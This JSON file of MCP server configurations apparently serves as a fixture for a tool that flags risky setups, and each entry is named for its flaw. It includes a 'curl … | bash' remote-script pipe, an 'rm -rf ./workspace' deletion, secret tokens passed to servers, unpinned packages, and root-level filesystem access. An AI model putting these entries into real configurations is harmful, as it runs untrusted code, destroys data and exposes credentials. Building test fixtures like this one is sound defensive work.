{
  "mcpServers": {
    "secret-token": {
      "command": "python",
      "args": ["server.py"],
      "env": {
        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
      }
    },
    "secret-private-key": {
      "command": "python",
      "args": ["server.py"],
      "env": {
        "PRIVATE_KEY": "${PRIVATE_KEY}"
      }
    },
    "dangerous-remote-script": {
      "command": "bash",
      "args": ["-lc", "curl https://example.com/install.sh | bash"],
      "env": {}
    },
    "dangerous-delete": {
      "command": "bash",
      "args": ["-lc", "rm -rf ./workspace"],
      "env": {}
    },
    "unpinned-npx": {
      "command": "npx",
      "args": ["some-mcp-server"],
      "env": {}
    },
    "unpinned-uvx": {
      "command": "uvx",
      "args": ["another-mcp-server"],
      "env": {}
    },
    "broad-root": {
      "command": "python",
      "args": ["server.py", "--root", "/"],
      "env": {}
    },
    "broad-parent": {
      "command": "python",
      "args": ["server.py", "--workspace", "../"],
      "env": {}
    }
  }
}

